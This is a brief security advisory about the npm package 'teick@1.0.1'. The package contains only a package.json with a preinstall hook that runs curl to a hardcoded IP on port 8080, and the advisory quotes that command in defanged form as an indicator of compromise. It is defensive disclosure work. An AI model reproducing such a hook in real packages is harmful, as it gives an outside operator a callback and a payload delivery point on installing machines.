details: `teick@1.0.1` is a namespace-claim shell that ships no executable code at all — the tarball contains a single `package.json` with no `main`, no `bin`, no README and no license — but declares a `preinstall` lifecycle hook that runs `curl hxxp://159[.]223[.]131[.]130:8080`. Because npm runs lifecycle scripts automatically on install, any project that adds this dependency immediately issues an HTTP request to the hardcoded IP 159[.]223[.]131[.]130 on port 8080, giving an operator-controlled host a callback from the installing machine and a delivery point for a follow-on payload. The package's advertised content is empty, so the hook has no purpose other than the outbound request. IOC: `hxxp://159[.]223[.]131[.]130:8080` (bare IP, no TLS, non-standard port).
